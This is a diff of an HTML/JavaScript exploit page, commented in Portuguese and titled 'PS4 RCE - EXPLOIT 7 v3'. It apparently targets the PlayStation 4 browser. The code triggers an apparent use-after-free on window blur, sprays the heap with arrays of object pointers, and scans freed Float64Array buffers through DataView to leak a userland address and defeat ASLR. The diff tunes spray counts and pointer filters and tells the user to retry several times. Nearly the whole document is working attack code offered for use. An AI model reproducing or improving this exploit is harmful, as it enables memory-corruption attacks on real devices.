@@ -1,24 +1,23 @@
-
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 RCE - EXPLOIT 7 v2 (REFINED SCANNER)</title>
+    <title>PS4 RCE - EXPLOIT 7 v3 (SNIPER MODE)</title>
     <style>
-        body { background-color: #000; color: #00ff00; font-family: 'Consolas', monospace; padding: 10px; font-size: 14px; }
+        body { background-color: #000; color: #0f0; font-family: monospace; font-size: 16px; padding: 20px; }
         #log { border: 1px solid #333; padding: 10px; margin-top: 10px; background: #050505; min-height: 400px; }
-        button { width: 100%; padding: 15px; background: #222; color: #0f0; border: 2px solid #0f0; font-weight: bold; cursor: pointer; font-size: 16px; }
-        .success { color: #fff; background: #008800; padding: 5px; border: 1px solid #0f0; }
-        .pointer { color: #00ffff; font-weight: bold; font-size: 1.3em; }
-        .float-ignore { color: #555; font-size: 0.8em; }
+        button { width: 100%; padding: 20px; background: #222; color: #0f0; border: 2px solid #0f0; font-weight: bold; font-size: 18px; cursor: pointer; }
+        .success { color: #fff; background: #008800; padding: 10px; border: 2px solid #0f0; animation: flash 1s infinite; }
+        .pointer { color: #00ffff; font-weight: bold; font-size: 1.5em; }
+        @keyframes flash { 50% { opacity: 0.5; } }
     </style>
 </head>
 <body>
 
-<h1>EXPLOIT 7 v2: POINTER HUNTER</h1>
-<p>Status: Filtro de Floats (0x3ff...) ATIVADO.</p>
+<h1>EXPLOIT 7 v3: SNIPER MODE</h1>
+<p>Status: Filtro Rígido Ativado. Ignorando Floats (1.0, 2.0...).</p>
 
-<button id="btnRun" onclick="runExploit()">INICIAR CAÇADA</button>
+<button id="btnRun" onclick="runExploit()">INICIAR CAÇADA FINAL</button>
 <div id="log">Logs...</div>
 
 <script>
@@ -29,8 +28,11 @@
     var controllers = [];
     var sprayStorage = [];
     
-    // Objeto alvo para vazar endereço
-    var targetObj = { id: 0x1337, mark: 0xBEEF };
+    // Objeto alvo. Queremos achar o endereço DESTE objeto.
+    var targetObj = { 
+        marker: 0x1337BEEF, 
+        padding: "ENCHER_MEMORIA_COM_PONTEIROS" 
+    };
 
     function runExploit() {
         document.getElementById('btnRun').disabled = true;
@@ -39,9 +41,10 @@
         controllers = [];
         sprayStorage = [];
 
-        for(let i=0; i<8000; i++) {
+        // ALOCAÇÃO
+        for(let i=0; i<5000; i++) {
             let c = new Float64Array(8);
-            c[0] = i; 
+            c[0] = i + 0.1; // Usamos float para não confundir com inteiros puros
             c.fill(1.1, 1);
             controllers.push(c);
         }
@@ -53,18 +56,18 @@
         window.onblur = function() {
             log(">>> UAF DISPARADO! Spraying Objects...");
 
-            // TÁTICA NOVA: SPRAY MAIS DENSO
-            // Usamos arrays maiores para garantir que o alocador use a mesma região
+            // TÁTICA NOVA: SPRAY MASSIVO DE ARRAYS MISTOS
+            // Arrays mistos [obj, obj] são guardados como ponteiros brutos (Butterflies).
             try {
-                for(let k=0; k<20000; k++) {
-                    // Spray misto: Ponteiros e Marcadores
-                    let s = [targetObj, targetObj, 0x1337, targetObj];
+                // Aumentamos a dose para 30.000 para forçar o GC a colaborar
+                for(let k=0; k<30000; k++) {
+                    let s = [targetObj, targetObj, targetObj, targetObj]; 
                     sprayStorage.push(s);
                 }
             } catch(e) {}
 
-            log("Spray feito. Escaneando (Ignorando 1.0 e 1.1)...");
-            setTimeout(scanForPointers, 200);
+            log("Spray Massivo concluído. Iniciando Scanner Sniper...");
+            setTimeout(scanForPointers, 300); // Mais tempo para o Heap assentar
         };
     }
 
@@ -76,44 +79,48 @@
             
             try {
                 let dv = new DataView(victim.buffer);
+                
+                // Lemos 2 inteiros de 32 bits (Low e High)
                 let valLow = dv.getUint32(0, true);
                 let valHigh = dv.getUint32(4, true);
 
-                // FILTRO DE "FALSO POSITIVO" (FLOATS)
-                // 0x3ff... e 0x400... são números floats pequenos (1.0, 2.0 etc)
-                // Ponteiros reais geralmente são 0x000... (Userland) ou 0xffff... (Kernel - raro aqui)
-                // Se começar com 3ff ou 00000000 (zero), ignoramos.
+                // --- O FILTRO DE OURO ---
+                // Um ponteiro Userland no PS4 tem esta cara: 0x00000008xxxxxxxx
+                // Parte Alta (High): Deve ser PEQUENA (ex: 1, 8, 16, 32).
+                // Se for 0x3ff... ou 0x400... é Float (Lixo).
+                // Se for 0, é Null ou Índice pequeno.
                 
-                // Queremos algo que NÃO seja zero e NÃO seja Float
-                if (valHigh !== 0 && (valHigh & 0xFFF00000) !== 0x3FF00000) {
+                // Lógica: 
+                // 1. High deve ser MAIOR que 0.
+                // 2. High deve ser MENOR que 0x00010000 (65536). Nenhum float começa com zeros assim.
+                
+                if (valHigh > 0 && valHigh < 0x00010000) {
                     
                     found = true;
                     let hex = "0x" + valHigh.toString(16).padStart(8,'0') + valLow.toString(16).padStart(8,'0');
                     
-                    logHTML(`<div class='success'>!!! PONTEIRO REAL DETECTADO (INDEX ${i}) !!!</div>`);
-                    logHTML(`Valor Raw: <span class='pointer'>${hex}</span>`);
-                    
-                    // Se o valor começar com 0x0000... e tiver números depois, é BINGO.
-                    if((valHigh & 0xFFFF0000) === 0) {
-                         logHTML("<div style='color:cyan'>CONFIRMADO: ENDEREÇO USERLAND VÁLIDO.</div>");
-                         logHTML("<div>ASLR DEFEATED.</div>");
-                    }
+                    logHTML(`<div class='success'>!!! PONTEIRO VÁLIDO DETECTADO (INDEX ${i}) !!!</div>`);
+                    logHTML(`Endereço: <span class='pointer'>${hex}</span>`);
+                    logHTML("<div>ASLR QUEBRADO.</div>");
 
-                    // Dump
-                    let dump = "";
+                    // Dump para confirmar (devemos ver padrões repetidos se for o nosso spray)
+                    let dump = "Dump parcial:<br>";
                     for(let off=0; off<32; off+=8) {
                         let h = dv.getUint32(off+4, true);
                         let l = dv.getUint32(off, true);
-                        dump += `Off ${off}: 0x${h.toString(16)}${l.toString(16)}<br>`;
+                        dump += `Off ${off}: 0x${h.toString(16).padStart(8,'0')}${l.toString(16).padStart(8,'0')}<br>`;
                     }
                     logHTML(dump);
+                    
+                    logHTML("<br><div style='border:2px solid red; color:white; padding:10px'>TIRE FOTO! ESTE É O ENDEREÇO REAL NA RAM.</div>");
                     return; 
                 }
             } catch(e) {}
         }
 
         if(!found) {
-            log("Apenas dados originais (Floats) encontrados. Tente de novo.");
+            log("Apenas dados originais encontrados. O Spray não alinhou.");
+            log("Dica: Tente rodar novamente. Heap Exploitation é estatístico (tente 5-10x).");
         }
     }
 </script>
